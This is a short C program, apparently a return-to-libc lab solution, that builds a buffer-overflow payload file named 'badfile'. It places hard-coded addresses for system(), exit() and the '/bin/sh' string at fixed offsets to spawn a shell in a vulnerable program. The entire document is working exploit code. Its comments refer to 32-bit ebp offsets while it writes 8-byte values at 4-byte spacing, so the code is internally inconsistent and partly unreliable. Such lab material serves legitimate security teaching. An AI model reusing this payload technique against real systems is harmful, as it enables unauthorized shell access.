#include<stdio.h>
#include<string.h>

int main(int argc, char **argv){
	char buf[200];
	FILE *badfile;
	
	memset(buf,0xaa,200);
	
	*(long *) &buf[76]= 0xfffffffff25a; //address of bin/sh +12
	*(long *) &buf[72] = 0xfffff7e2f2f0;  // address of ebp+8(exit)
	*(long *) &buf[68] = 0xfffff7e3cec4; // address of ebp+4(system)
	
	badfile = fopen("./badfile", "xw");
	fwrite(buf,sizeof(buf),1,badfile);
	fclose(badfile);
}
